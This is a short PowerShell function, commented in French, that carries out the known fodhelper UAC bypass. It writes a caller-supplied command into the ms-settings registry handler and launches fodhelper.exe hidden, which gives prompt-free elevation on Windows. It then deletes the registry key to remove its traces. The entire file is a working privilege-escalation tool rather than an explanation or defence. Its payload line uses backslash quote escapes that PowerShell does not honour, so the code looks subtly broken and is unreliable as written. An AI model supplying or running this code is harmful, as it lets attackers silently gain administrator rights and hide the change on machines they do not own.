function UACFodhelperBypass {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )

    # Échappe la commande pour l’insérer dans cmd.exe /c start
    $escaped = $Command.Replace('"', '""')  # double quote escaping for cmd

    # Format final
    $payload = "cmd.exe /c start \"\" $escaped"

    # Crée la clé de registre pour le bypass
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $payload -Force

    # Lance le bypass via fodhelper (élévation sans prompt)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # Attends un peu pour laisser le temps au shell élevé de se lancer
    Start-Sleep -Seconds 3

    # Nettoyage
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}
